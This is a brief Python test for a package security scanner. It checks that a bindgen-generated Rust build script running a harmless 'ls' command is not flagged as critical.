async def test_generated_code_downgraded(tmp_path):
    f = tmp_path / "build.rs"
    f.write_text('// Generated by bindgen\nuse std::process::Command;\nfn main() { Command::new("ls").status(); }\n')
    result = await _make_scanner().scan(_make_package(), [f])
    matches = result.metadata.get("matches", [])
    for m in matches:
        assert m["severity"] != "critical"


